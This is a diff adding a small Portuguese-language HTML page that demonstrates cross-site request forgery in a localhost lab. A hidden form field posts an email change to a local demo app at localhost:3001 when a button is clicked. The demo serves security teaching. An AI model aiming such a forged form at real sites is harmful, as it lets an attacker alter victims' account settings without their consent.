@@ -1,0 +1,12 @@
+<!doctype html>
+<html lang="pt-BR">
+<head><meta charset="utf-8"><title>Demo CSRF - laboratório local</title></head>
+<body>
+<h1>Demonstração CSRF - somente localhost</h1>
+<p>Esta página simula um site malicioso. Faça login na V1 em <code>http://localhost:3001/login-demo</code> e abra esta página por um servidor HTTP local.</p>
+<form action="http://localhost:3001/change-email" method="POST">
+<input type="hidden" name="email" value="alterado-por-csrf@local.test">
+<button type="submit">Executar demonstração CSRF</button>
+</form>
+</body>
+</html>
